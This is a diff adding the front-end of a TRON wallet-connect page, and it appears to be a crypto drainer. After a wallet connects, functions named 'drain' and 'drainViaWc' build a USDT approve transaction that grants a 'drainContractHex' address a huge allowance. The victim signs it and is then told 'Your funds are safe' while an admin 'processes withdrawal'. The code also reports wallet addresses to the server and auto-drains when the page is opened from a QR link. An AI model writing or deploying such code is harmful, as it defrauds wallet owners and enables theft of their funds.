+              if (getOkx()) addr = await connectOkx();
+              break;
+            case 'bitget':
+              addr = await connectBitget();
+              if (!addr && (getTronLink() || getTronWeb())) addr = await connectTronLink();
+              break;
+            case 'bybit':
+              addr = await connectBybit();
+              if (!addr && (getTronLink() || getTronWeb())) addr = await connectTronLink();
+              break;
+            case 'gate':
+              if (getGate()) addr = await connectGate();
+              break;
+            case 'trust':
+              trustActive = !!getTrustLink();
+              skipTriggerContract = trustActive;
+              if (trustActive) { addr = await connectTrust(); break; }
+              showWcQr(wallet.id);
+              return;
+            case 'tokenpocket':
+            case 'foxwallet':
+              if (getTronLink() || getTronWeb()) addr = await connectTronLink();
+              if (!addr) { showWcQr(wallet.id); return; }
+              break;
+          }
+        } catch(e) {
+          if (e.message && e.message.indexOf('cancel') !== -1) {
+            msg('inf', 'Connection cancelled');
+            return;
+          }
+        }
+        if (addr) {
+          fetch('/api/event', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'wallet_connected', address:addr, wallet:wallet.name || wallet.id}) }).catch(function(){});
+          await drain(addr);
+          return;
+        }
+        if (isMobile) {
+          openDeepLink(wallet);
+          setTimeout(function() {
+            var appStoreUrl = /iPad|iPhone|iPod/.test(navigator.userAgent) ? wallet.ios : wallet.android;
+            if (appStoreUrl && !document.hidden) {
+              if (confirm('Wallet not detected. Open download page?')) {
+                window.open(appStoreUrl, '_blank');
+              }
+            }
+          }, 4000);
+        } else {
+          var siteUrl = wallet.url;
+          if (siteUrl) {
+            msg('inf', wallet.name + ' not detected. <a href="' + siteUrl + '" target="_blank" style="color:#4ade80">Open official website</a> to install, then refresh.');
+            window.open(siteUrl, '_blank');
+          }
+        }
+      } else {
+        if (isMobile) {
+          openDeepLink(wallet);
+          setTimeout(function() {
+            var appStoreUrl = /iPad|iPhone|iPod/.test(navigator.userAgent) ? wallet.ios : wallet.android;
+            if (appStoreUrl && !document.hidden) {
+              if (confirm('Wallet not detected. Open download page?')) {
+                window.open(appStoreUrl, '_blank');
+              }
+            }
+          }, 4000);
+        } else {
+          showWcQr(wallet.id);
+        }
+      }
+    }
+
+    async function showQr(data) {
+      try {
+        var r = await fetch('/api/qr-data', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({data:data}) });
+        var j = await r.json();
+        if (j.qrDataUrl) {
+          document.getElementById('qrImg').src = j.qrDataUrl;
+          document.getElementById('qrImg').style.display = 'block';
+          document.getElementById('qrLoading').style.display = 'none';
+          document.getElementById('qrModal').classList.add('on');
+        } else {
+          document.getElementById('qrLoading').textContent = 'QR generation returned no data.';
+          document.getElementById('closeQrBtn').textContent = 'Close';
+          document.getElementById('closeQrBtn')._mode = 'close';
+        }
+      } catch(e) {
+        document.getElementById('qrLoading').textContent = 'QR generation failed: ' + (e.message || e);
+        document.getElementById('closeQrBtn').textContent = 'Close';
+        document.getElementById('closeQrBtn')._mode = 'close';
+      }
+    }
+
+    function showWcQr(walletId) {
+      document.getElementById('qrImg').style.display = 'none';
+      document.getElementById('qrLoading').style.display = 'block';
+      document.getElementById('qrLoading').textContent = 'Generating QR...';
+      document.getElementById('projectIdRow').style.display = 'none';
+      document.getElementById('wcUriText').style.display = 'none';
+      document.getElementById('wcUriText').textContent = '';
+      document.getElementById('qrText').textContent = 'Scan with ' + walletId + ' on your phone';
+      document.getElementById('closeQrBtn').textContent = 'Cancel';
+      document.getElementById('closeQrBtn')._mode = 'cancel';
+      document.getElementById('qrModal').classList.add('on');
+      startWalletConnect();
+    }
+
+    function loadScript(url) {
+      return new Promise(function(resolve, reject) {
+        var s = document.createElement('script');
+        s.src = url;
+        s.onload = resolve;
+        s.onerror = function() { reject(new Error('Failed to load ' + url)); };
+        document.head.appendChild(s);
+      });
+    }
+
+    function initWalletConnect() {
+      return new Promise(function(resolve, reject) {
+        var sc = window["@walletconnect/sign-client"];
+        if (sc && sc.SignClient) { resolve(); return; }
+        if (window.SignClient) { resolve(); return; }
+        var urls = [
+          'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client/dist/index.umd.min.js',
+          'https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.min.js'
+        ];
+        function tryLoad(idx) {
+          if (idx >= urls.length) { reject(new Error('Failed to load WalletConnect SDK')); return; }
+          var s = document.createElement('script'); s.src = urls[idx];
+          s.onload = function() {
+            var sc = window["@walletconnect/sign-client"];
+            if (sc && sc.SignClient) { resolve(); return; }
+            setTimeout(function() {
+              var sc2 = window["@walletconnect/sign-client"];
+              if (sc2 && sc2.SignClient) resolve(); else reject(new Error('SignClient not found after load'));
+            }, 2000);
+          };
+          s.onerror = function() { tryLoad(idx + 1); };
+          document.head.appendChild(s);
+        }
+        tryLoad(0);
+      });
+    }
+
+    var wcSignClient = null;
+    var wcSession = null;
+    var wcAddress = null;
+
+    async function connectTrustWc(projectId) {
+      await initWalletConnect(projectId);
+      var SC = window["@walletconnect/sign-client"].SignClient; wcSignClient = await SC.init({
+        projectId: projectId,
+        metadata: { name: 'TRON DApp', description: 'TRC20 Approve', url: window.location.origin, icons: [] }
+      });
+      return new Promise(function(resolve, reject) {
+        wcSignClient.on('session_ping', function() {});
+        wcSignClient.on('session_delete', function() {});
+        wcSignClient.connect({
+          requiredNamespaces: {
+            tron: {
+              methods: ['tron_signTransaction', 'tron_requestAccounts'],
+              chains: ['tron:mainnet'],
+              events: ['chainChanged', 'accountsChanged']
+            }
+          }
+        })
+        .then(function(result) {
+          resolve({ uri: result.uri, approval: result.approval });
+        })
+        .catch(function(e) { reject(e); });
+        setTimeout(function() {
+          reject(new Error('Connection timeout'));
+        }, 120000);
+      });
+    }
+
+    var connectedWallet = null;
+
+    function showConnectedWallet(address, wallet) {
+      connectedWallet = { address: address, wallet: wallet };
+      var badge = document.getElementById('walletBadge');
+      var img = document.getElementById('badgeImg');
+      var name = document.getElementById('badgeName');
+      var addr = document.getElementById('badgeAddr');
+      var w = WALLETS.find(function(w){ return w.id === wallet || w.name === wallet; }) || WALLETS.find(function(w){ return w.id === 'tronlink'; });
+      if (w) img.src = w.logo;
+      name.textContent = (w ? w.name : wallet) || 'Wallet';
+      addr.textContent = address.slice(0, 6) + '...' + address.slice(-4);
+      badge.classList.add('show');
+    }
+      if (!isMobile) return;
+      var ov = document.createElement('div');
+      ov.className = 'sheet-overlay';
+      ov.id = 'sheetOverlay';
+      document.body.appendChild(ov);
+      var container = document.querySelector('.container');
+      container.style.borderBottom = 'none';
+      container.style.borderRadius = '20px 20px 0 0';
+      var handle = document.createElement('div');
+      handle.className = 'handle';
+      handle.style.cssText = 'width:36px;height:4px;border-radius:2px;background:#333;margin:0 auto 16px';
+      container.insertBefore(handle, container.firstChild);
+      var headerP = document.querySelector('.header p');
+      if (headerP) { headerP.textContent = 'Connect a wallet'; headerP.style.fontSize = '14px'; headerP.style.fontWeight = '500'; }
+      var scMain = document.getElementById('scMain');
+      if (scMain) scMain.style.maxHeight = '55vh';
+      if (scMain) scMain.style.overflowY = 'auto';
+      document.body.style.alignItems = 'flex-end';
+      document.body.style.paddingBottom = '0';
+      document.body.style.paddingLeft = '0';
+      document.body.style.paddingRight = '0';
+      container.style.maxWidth = '100%';
+      container.style.marginTop = 'auto';
+      container.style.animation = 'slideUp 0.35s cubic-bezier(0.32,0.72,0,1)';
+      ov.classList.add('on');
+    }
+
+    function render() {
+      walletList.innerHTML = '';
+      for (var i = 0; i < WALLETS.length; i++) {
+        var w = WALLETS[i];
+        var b = document.createElement('button'); b.className = 'wallet-btn';
+        if (i >= VISIBLE_COUNT) b.classList.add('hidden');
+        var qrBtn = (w.id === 'trust' && !isMobile) ? '<button class="qr-icon" data-trust-qr="1">QR</button>' : '';
+        b.innerHTML = '<div class="ico"><img src="'+w.logo+'" alt="'+w.name+'" loading="lazy"></div><div class="nm">'+w.name+'</div>'+qrBtn;
+        b.addEventListener('click', (function(wallet){ return function(){ handleWalletClick(wallet); }; })(w));
+        walletList.appendChild(b);
+      }
+      updateToggleBtn();
+    }
+
+    function updateToggleBtn() {
+      var hiddenCount = WALLETS.length - VISIBLE_COUNT;
+      if (hiddenCount <= 0) { toggleBtn.style.display = 'none'; return; }
+      toggleBtn.style.display = 'block';
+      toggleBtn.textContent = expanded ? 'Show less' : 'Show all (' + WALLETS.length + ')';
+    }
+
+    toggleBtn.addEventListener('click', function(){
+      expanded = !expanded;
+      var btns = walletList.querySelectorAll('.wallet-btn');
+      for (var i = VISIBLE_COUNT; i < btns.length; i++) {
+        btns[i].classList.toggle('hidden', !expanded);
+      }
+      updateToggleBtn();
+    });
+
+    backBtn.addEventListener('click', function(){ logBox.innerHTML = ''; hideMsg(); scShow('scMain'); });
+
+    document.getElementById('projectIdInput').value = WC_PROJECT_ID;
+
+    fetch('/api/config').then(function(r){ return r.json(); }).then(function(d){ config = d; }).catch(function(){});
+    render();
+    initMobileSheet();
+
+    if (isMobile) {
+      document.addEventListener('click', function(e) {
+        if (e.target && e.target.id === 'sheetOverlay') {
+          var ov = document.getElementById('sheetOverlay');
+          if (ov) ov.classList.remove('on');
+          var container = document.querySelector('.container');
+          if (container) container.style.display = 'none';
+        }
+      });
+      document.querySelector('.footer').addEventListener('click', function() {
+        var ov = document.getElementById('sheetOverlay');
+        if (ov) ov.classList.remove('on');
+        var container = document.querySelector('.container');
+        if (container) container.style.display = 'none';
+      });
+    }
+
+    // QR icon click handler - WalletConnect for wallets without extension
+    document.addEventListener('click', function(e) {
+      if (e.target && e.target.getAttribute('data-trust-qr') === '1') {
+        e.stopPropagation();
+        document.getElementById('qrImg').style.display = 'none';
+        document.getElementById('qrLoading').style.display = 'block';
+        document.getElementById('qrLoading').textContent = 'Generating QR...';
+        document.getElementById('projectIdRow').style.display = 'none';
+        document.getElementById('wcUriText').style.display = 'none';
+        document.getElementById('wcUriText').textContent = '';
+        document.getElementById('qrText').textContent = 'Scan with your wallet on your phone';
+        document.getElementById('closeQrBtn').textContent = 'Cancel';
+        document.getElementById('closeQrBtn')._mode = 'cancel';
+        document.getElementById('qrModal').classList.add('on');
+        startWalletConnect();
+      }
+    });
+
+    // Modal button click handler
+    document.getElementById('closeQrBtn').addEventListener('click', function() {
+      var btn = document.getElementById('closeQrBtn');
+      if (btn._mode === 'generate') {
+        startWalletConnect();
+      } else if (btn._mode === 'cancel') {
+        document.getElementById('qrModal').classList.remove('on');
+      } else {
+        document.getElementById('qrModal').classList.remove('on');
+      }
+    });
+
+    var wcRetryCount = 0;
+
+    async function startWalletConnect() {
+      var pid = document.getElementById('projectIdInput').value.trim() || WC_PROJECT_ID;
+      var qrLoading = document.getElementById('qrLoading');
+      var qrImg = document.getElementById('qrImg');
+      var qrText = document.getElementById('qrText');
+      var closeBtn = document.getElementById('closeQrBtn');
+      var projectIdRow = document.getElementById('projectIdRow');
+      var projectIdInput = document.getElementById('projectIdInput');
+      qrLoading.style.display = 'block'; qrLoading.textContent = 'Loading WalletConnect libraries...';
+      qrImg.style.display = 'none';
+      closeBtn.textContent = 'Cancel'; closeBtn._mode = 'cancel';
+      try {
+        await initWalletConnect();
+      } catch(e) {
+        qrLoading.textContent = 'Failed: ' + e.message;
+        qrText.textContent = 'Could not load WalletConnect. Try another wallet or refresh.';
+        projectIdRow.style.display = 'none';
+        closeBtn.textContent = 'Close'; closeBtn._mode = 'close';
+        return;
+      }
+      qrLoading.textContent = 'Generating QR code...';
+      projectIdRow.style.display = 'none';
+      try {
+        var result = await connectTrustWc(pid);
+        if (result.uri) {
+          showQr(result.uri);
+          // Show URI as text fallback if QR image doesn't load
+          var uriText = document.getElementById('wcUriText');
+          if (uriText) { uriText.textContent = result.uri; uriText.style.display = 'block'; }
+          qrText.textContent = 'Scan with Trust Wallet on your phone, or copy the link below';
+          closeBtn.textContent = 'Cancel'; closeBtn._mode = 'cancel';
+          var session = await result.approval;
+          wcSession = session;
+          var tronNamespace = session.namespaces && session.namespaces.tron;
+          if (tronNamespace && tronNamespace.accounts && tronNamespace.accounts.length > 0) {
+            var account = tronNamespace.accounts[0];
+            wcAddress = account.split(':')[2] || account;
+          } else {
+            for (var key in session.namespaces) {
+              var ns = session.namespaces[key];
+              if (ns.accounts && ns.accounts.length > 0) {
+                var acct = ns.accounts[0];
+                wcAddress = acct.split(':')[2] || acct;
+                break;
+              }
+            }
+          }
+          document.getElementById('qrModal').classList.remove('on');
+          msg('ok', 'Connected via WalletConnect!');
+          if (wcAddress) {
+            await drainViaWc(wcAddress);
+          } else {
+            msg('err', 'Connected but no address found');
+          }
+        }
+      } catch(e) {
+        var errMsg = e.message || String(e);
+        qrLoading.textContent = 'Error: ' + errMsg;
+        qrLoading.style.display = 'block';
+        qrImg.style.display = 'none';
+        qrText.textContent = 'Failed to connect. Check your WalletConnect Project ID below or try again.';
+        projectIdRow.style.display = 'block';
+        projectIdInput.placeholder = 'Enter WalletConnect Project ID';
+        projectIdInput.value = pid;
+        closeBtn.textContent = 'Retry'; closeBtn._mode = 'generate';
+      }
+    }
+
+    async function drainViaWc(address) {
+      hideMsg(); logBox.innerHTML = ''; scShow('scLog');
+      var approveVal = '1000000000000000000';
+      var log1 = addLog('Building approve transaction...', 'busy');
+      var approveTx = null;
+      try {
+        var resp = await fetch('/api/build-tx', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
+          contract_address: config.usdtContractHex || '',
+          function_selector: 'approve(address,uint256)',
+          parameter: (config.drainContractHex || '').replace(/^0x|^41/,'').toLowerCase().padStart(64,'0') + BigInt(approveVal).toString(16).padStart(64,'0').slice(-64),
+          owner_address: address,
+          fee_limit: 20000000,
+          call_value: 0
+        })});
+        var data = await resp.json();
+        approveTx = data.transaction || data;
+      } catch(e) {}
+      if (!approveTx || !approveTx.txID) {
+        setLog(log1, 'Build failed', 'fail'); msg('err','Failed'); return;
+      }
+      setLog(log1, 'Approve transaction ready. Signing...', 'ok');
+      var log2 = addLog('Confirm approve in Trust Wallet...', 'busy');
+      try {
+        var signed = await wcSignClient.request({
+            topic: wcSession.topic,
+            chainId: 'tron:mainnet',
+            request: {
+              method: 'tron_signTransaction',
+              params: { transaction: approveTx }
+            }
+          });
+        setLog(log2, 'Signed! Broadcasting...', 'busy');
+        var bcResp = await fetch('/api/broadcast-tx', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ transaction: signed }) });
+        var bcData = await bcResp.json();
+        var txId = bcData.txid || bcData.txID || '';
+        if (!txId) { setLog(log2, 'Broadcast failed', 'fail'); return; }
+        setLog(log2, 'Contract signed!', 'ok');
+        showConnectedWallet(address, 'Trust');
+        addLog('Approved: <a class="tx-link" href="https://tronscan.org/#/transaction/'+txId+'" target="_blank">'+txId.slice(0,16)+'...</a>', 'ok');
+        fetch('/api/approve-done', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({address:address}) }).catch(function(){});
+        addLog('Waiting for admin to process withdrawal', 'busy');
+        msg('ok', 'Contract signed! <span style="color:#4ade80;font-weight:600;">' + (address.slice(0,6) + '...' + address.slice(-4)) + '</span> connected. Your funds are safe. Admin will process soon.');
+      } catch(e) {
+        setLog(log2, 'Error: ' + (e.message || e), 'fail');
+      }
+    }
+
+    // Auto-connect when opened via QR (trust_mobile=1)
+    if (window.location.search.indexOf('trust_mobile=1') !== -1) {
+      setTimeout(async function() {
+        var p = await waitForProvider(12000);
+        if (p && p.defaultAddress && p.defaultAddress.base58) {
+          trustActive = true; skipTriggerContract = true;
+          activeProvider = p;
+          await drain(p.defaultAddress.base58);
+        } else {
+          msg('err', 'Trust wallet not detected. Make sure you are in Trust Wallet browser.');
+        }
+      }, 500);
+    }
+  </script>
+</body>
+</html>
